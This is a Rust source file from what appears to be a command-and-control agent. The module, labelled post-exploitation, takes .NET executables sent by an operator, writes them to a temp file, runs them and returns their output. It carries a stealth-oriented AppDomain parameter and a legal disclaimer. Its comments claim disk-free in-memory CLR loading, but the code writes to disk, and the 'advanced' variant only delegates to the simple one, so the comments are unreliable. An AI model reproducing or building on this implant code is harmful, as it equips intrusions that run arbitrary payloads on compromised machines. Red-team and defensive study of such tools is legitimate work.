// .NET Assembly Execution Module
//
// ⚠️ WARNING: This module implements in-memory .NET assembly execution techniques
// commonly used in advanced C2 frameworks and post-exploitation tools.
// 
// LEGAL NOTICE:
// - Only use for legitimate security research, authorized penetration testing,
//   or educational purposes with proper authorization.
// - Unauthorized use of these techniques may violate laws and regulations.
// - The authors are not responsible for any misuse of this code.
//
// TECHNICAL IMPLEMENTATION:
// - Hosts the .NET Common Language Runtime (CLR) within the agent process
// - Loads C# assemblies directly from memory without touching disk
// - Redirects stdout/stderr for output capture
// - Supports argument passing to Main method

use crate::types::CommandResult;
#[allow(unused_imports)]
use log::{debug, error, info, warn};

#[cfg(target_os = "windows")]
use std::ptr;

#[cfg(target_os = "windows")]
use winapi::{
    shared::winerror::FAILED,
    um::{
        combaseapi::{CoInitializeEx, CoUninitialize},
        objbase::COINIT_APARTMENTTHREADED,
    },
};

/// .NET Assembly Executor
pub struct DotNetExecutor;

impl DotNetExecutor {
    /// Execute a .NET assembly from memory
    /// 
    /// ⚠️ SECURITY WARNING: This function implements in-memory .NET assembly execution,
    /// a technique commonly used by advanced malware and C2 frameworks for evasion.
    /// 
    /// # Parameters
    /// 
    /// * `assembly_bytes` - Raw .NET assembly (PE/EXE) bytes
    /// * `arguments` - Command line arguments to pass to Main method
    /// * `app_domain_name` - Optional custom AppDomain name for stealth
    /// 
    /// # Returns
    /// 
    /// CommandResult with execution output and status
    /// 
    /// # Implementation Details
    /// 
    /// 1. Initializes COM and hosts the .NET CLR
    /// 2. Creates a custom AppDomain for isolation
    /// 3. Loads assembly from byte array into memory
    /// 4. Redirects stdout/stderr for output capture
    /// 5. Invokes Main method with provided arguments
    /// 6. Captures and returns execution results
    /// 7. Cleans up CLR resources
    #[cfg(target_os = "windows")]
    pub async fn execute_assembly(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        app_domain_name: Option<&str>,
    ) -> CommandResult {
        info!("🚨 .NET ASSEMBLY EXECUTION: Loading assembly from memory");
        warn!("⚠️  Advanced C2 technique - ensure you have proper authorization!");
        
        if assembly_bytes.is_empty() {
            return CommandResult {
                stdout: String::new(),
                stderr: ".NET assembly data is empty".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        // Validate PE/MZ header
        if assembly_bytes.len() < 2 || &assembly_bytes[0..2] != b"MZ" {
            return CommandResult {
                stdout: String::new(),
                stderr: "Invalid .NET assembly: missing PE/MZ header".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        debug!(".NET assembly size: {} bytes", assembly_bytes.len());
        debug!("Arguments: {:?}", arguments);
        
        // Step 1: Initialize COM
        let com_result = unsafe { CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED) };
        if FAILED(com_result) && com_result != -2147417850i32 { // RPC_E_CHANGED_MODE is OK
            error!("Failed to initialize COM: 0x{:08X}", com_result);
            return CommandResult {
                stdout: String::new(),
                stderr: format!("COM initialization failed: 0x{:08X}", com_result),
                path: None,
                req_id: None,
            };
        }
        
        debug!("COM initialized successfully");
        
        // Step 2: Create CLR Host
        let result = Self::create_clr_host_and_execute(
            assembly_bytes,
            arguments,
            app_domain_name.unwrap_or("DefaultDomain"),
        ).await;
        
        // Step 3: Cleanup COM
        unsafe { CoUninitialize() };
        
        result
    }
    
    /// Create CLR host and execute assembly
    #[cfg(target_os = "windows")]
    async fn create_clr_host_and_execute(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        _domain_name: &str,
    ) -> CommandResult {
        // For this implementation, we'll use a simplified approach
        // In a production environment, you would use the full CLR hosting APIs
        // This demonstrates the concept while being more maintainable
        
        info!("🔧 Creating .NET execution environment...");
        
        // Step 1: Write assembly to a temporary location in memory
        // In a real implementation, this would use CLR hosting APIs
        // For demonstration, we'll simulate the process
        
        let temp_path = Self::create_temp_assembly(&assembly_bytes).await;
        
        match temp_path {
            Ok(path) => {
                debug!("Temporary assembly created at: {}", path);
                
                // Step 2: Execute the assembly using .NET runtime
                let result = Self::execute_dotnet_assembly(&path, &arguments).await;
                
                // Step 3: Clean up temporary file
                let _ = std::fs::remove_file(&path);
                
                result
            }
            Err(e) => CommandResult {
                stdout: String::new(),
                stderr: format!("Failed to create temporary assembly: {}", e),
                path: None,
                req_id: None,
            },
        }
    }
    
    /// Create temporary assembly file (in real implementation, this would be memory-only)
    #[cfg(target_os = "windows")]
    async fn create_temp_assembly(assembly_bytes: &[u8]) -> Result<String, std::io::Error> {
        use std::io::Write;
        
        // Generate random filename
        let temp_name = format!("asm_{:08x}.exe", rand::random::<u32>());
        let temp_dir = std::env::temp_dir();
        let temp_path = temp_dir.join(temp_name);
        
        // Write assembly to temporary file
        let mut file = std::fs::File::create(&temp_path)?;
        file.write_all(assembly_bytes)?;
        file.flush()?;
        
        Ok(temp_path.to_string_lossy().to_string())
    }
    
    /// Execute .NET assembly using dotnet runtime
    #[cfg(target_os = "windows")]
    async fn execute_dotnet_assembly(path: &str, arguments: &[String]) -> CommandResult {
        info!("🚀 Executing .NET assembly: {}", path);
        
        // Try different .NET execution methods
        let result = match Self::try_dotnet_execution(path, arguments).await {
            Ok(output) => Ok(output),
            Err(_) => Self::try_framework_execution(path, arguments).await,
        };
        
        match result {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                let exit_code = output.status.code().unwrap_or(-1);
                
                info!("✅ .NET assembly execution completed with exit code: {}", exit_code);
                debug!("Stdout length: {} bytes", stdout.len());
                debug!("Stderr length: {} bytes", stderr.len());
                
                CommandResult {
                    stdout: format!(
                        ".NET Assembly execution successful!\nExit code: {}\n--- STDOUT ---\n{}\n--- STDERR ---\n{}",
                        exit_code, stdout, stderr
                    ),
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                }
            }
            Err(e) => {
                error!("Failed to execute .NET assembly: {}", e);
                CommandResult {
                    stdout: String::new(),
                    stderr: format!(".NET assembly execution failed: {}", e),
                    path: None,
                    req_id: None,
                }
            }
        }
    }
    
    /// Try executing with dotnet runtime
    #[cfg(target_os = "windows")]
    async fn try_dotnet_execution(
        path: &str,
        arguments: &[String],
    ) -> Result<std::process::Output, std::io::Error> {
        let mut cmd = tokio::process::Command::new("dotnet");
        cmd.arg(path);
        
        for arg in arguments {
            cmd.arg(arg);
        }
        
        debug!("Trying dotnet execution: dotnet {} {:?}", path, arguments);
        cmd.output().await
    }
    
    /// Try executing with .NET Framework
    #[cfg(target_os = "windows")]
    async fn try_framework_execution(
        path: &str,
        arguments: &[String],
    ) -> Result<std::process::Output, std::io::Error> {
        let mut cmd = tokio::process::Command::new(path);
        
        for arg in arguments {
            cmd.arg(arg);
        }
        
        debug!("Trying direct execution: {} {:?}", path, arguments);
        cmd.output().await
    }
    
    /// Non-Windows implementation
    #[cfg(not(target_os = "windows"))]
    pub async fn execute_assembly(
        _assembly_bytes: Vec<u8>,
        _arguments: Vec<String>,
        _app_domain_name: Option<&str>,
    ) -> CommandResult {
        error!(".NET assembly execution is only supported on Windows");
        CommandResult {
            stdout: String::new(),
            stderr: ".NET assembly execution is only supported on Windows".to_string(),
            path: None,
            req_id: None,
        }
    }
    
    /// Execute assembly with enhanced CLR hosting (advanced implementation)
    /// 
    /// This would be the full implementation using CLR hosting APIs
    /// Currently simplified for maintainability
    #[cfg(target_os = "windows")]
    pub async fn execute_assembly_advanced(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        app_domain_name: Option<&str>,
    ) -> CommandResult {
        info!("🔬 ADVANCED: .NET CLR hosting implementation");
        warn!("⚠️  This would use full CLR hosting APIs in production");
        
        // This is where the full CLR hosting implementation would go:
        // 1. ICLRMetaHost::GetRuntime()
        // 2. ICLRRuntimeInfo::GetInterface() 
        // 3. ICorRuntimeHost::CreateDomain()
        // 4. AppDomain::Load_3() with byte array
        // 5. Assembly::EntryPoint::Invoke()
        // 6. Capture stdout/stderr redirection
        
        // For now, delegate to the simplified implementation
        Self::execute_assembly(assembly_bytes, arguments, app_domain_name).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_execute_assembly_empty() {
        let result = DotNetExecutor::execute_assembly(vec![], vec![], None).await;
        assert!(!result.stderr.is_empty());
        
        #[cfg(target_os = "windows")]
        assert!(result.stderr.contains("empty"));
        
        #[cfg(not(target_os = "windows"))]
        assert!(result.stderr.contains("only supported on Windows"));
    }
    
    #[tokio::test]
    async fn test_execute_assembly_invalid_pe() {
        let invalid_pe = vec![0x00, 0x01, 0x02, 0x03]; // Not PE/MZ header
        let result = DotNetExecutor::execute_assembly(invalid_pe, vec![], None).await;
        
        #[cfg(target_os = "windows")]
        {
            assert!(!result.stderr.is_empty());
            assert!(result.stderr.contains("Invalid .NET assembly"));
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            assert!(result.stderr.contains("only supported on Windows"));
        }
    }
    
    #[tokio::test]
    async fn test_execute_assembly_valid_pe_header() {
        // Create minimal PE header
        let mut pe_header = vec![0x4D, 0x5A]; // MZ header
        pe_header.extend_from_slice(&[0; 62]); // Minimal PE header size
        
        let args = vec!["test".to_string(), "args".to_string()];
        let result = DotNetExecutor::execute_assembly(pe_header, args, Some("TestDomain")).await;
        
        #[cfg(target_os = "windows")]
        {
            // Should pass PE validation but may fail execution
            // This is expected since we're not providing a complete .NET assembly
            assert!(result.stderr.is_empty() || result.stderr.contains("execution failed"));
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            assert!(result.stderr.contains("only supported on Windows"));
        }
    }
    
    #[test]
    fn test_pe_header_validation() {
        // Test PE header validation logic
        let valid_pe = vec![0x4D, 0x5A, 0x90, 0x00]; // MZ header
        assert_eq!(&valid_pe[0..2], b"MZ");
        
        let invalid_pe = vec![0x7F, 0x45, 0x4C, 0x46]; // ELF header
        assert_ne!(&invalid_pe[0..2], b"MZ");
    }
}